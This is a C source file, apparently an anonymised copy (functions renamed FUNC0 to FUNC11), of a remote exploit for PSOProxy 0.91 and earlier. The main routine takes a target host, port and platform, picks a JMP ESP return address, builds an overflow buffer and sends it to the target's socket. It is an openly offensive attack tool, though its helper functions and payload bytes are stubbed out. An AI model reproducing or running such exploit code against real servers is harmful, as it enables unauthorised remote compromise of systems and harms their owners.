#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {char* plat; int ret; } ;

/* Variables and functions */
 int D_PORT ; 
 long JMP_ESP ; 
 int SIZE ; 
 size_t FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (long) ; 
 int /*<<< orphan*/  FUNC2 (long) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 TYPE_1__* exp_os ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC6 (int,char**,char*) ; 
 int /*<<< orphan*/  optarg ; 
 scalar_t__ opterr ; 
 int optopt ; 
 long FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int,char*) ; 
 int FUNC9 (long,int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ,int) ; 

int
FUNC11(int argc,char *argv[])
{
      int i, option, fd, port = D_PORT;
      long host = 0, ret = JMP_ESP;
      char * option_list = "h:p:t:", buffer[SIZE];

      opterr = 0;

      FUNC5(stdout,"PSOProxy <= 0.91 remote exploit\r\n");
      FUNC5(stdout,"Bug found by Donato Ferrante <fdonato@autistici.org>\r\n");
      FUNC5(stdout,"Exploit written by Li0n7 <Li0n7@voila.fr>\r\n\n");

      if (argc < 2) FUNC3(argv[0]);

      while((option = FUNC6(argc,argv,option_list)) != -1)
          switch(option)
          {
              case 'h':
                  host = FUNC7(optarg);
                  if(!host)
                  {
                      FUNC5(stderr,"[-] Host address incorrect.\n");
                      FUNC4(0);
                  }
                  break;
              case 'p':
                  port = FUNC0(optarg);
                  if(port > 65535 || port < 0) FUNC4(1);
                  break;
              case 't':
                  for(i=0; exp_os[i].plat != NULL; i++)
                  if(FUNC0(optarg) > i || FUNC0(optarg) < 0)
                  {
                      FUNC5(stderr,"Platforms supported are:\n");
                      for(i=0; exp_os[i].plat != NULL; i++)
                          FUNC5(stderr,"\t%i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);
                          FUNC4(1);
                  }
                  ret = exp_os[FUNC0(optarg)].ret;
                  break;
              case '?':
                  FUNC5(stderr,"[-] option \'%c\' unknown\n",optopt);
                  FUNC3(argv[0]);
          }

      fd = FUNC9(host,port);
      FUNC10(buffer,FUNC2(ret),SIZE-1);
      buffer[SIZE-1] = '\0';
      FUNC8(fd,buffer);
      FUNC1(host);
      return 0;
}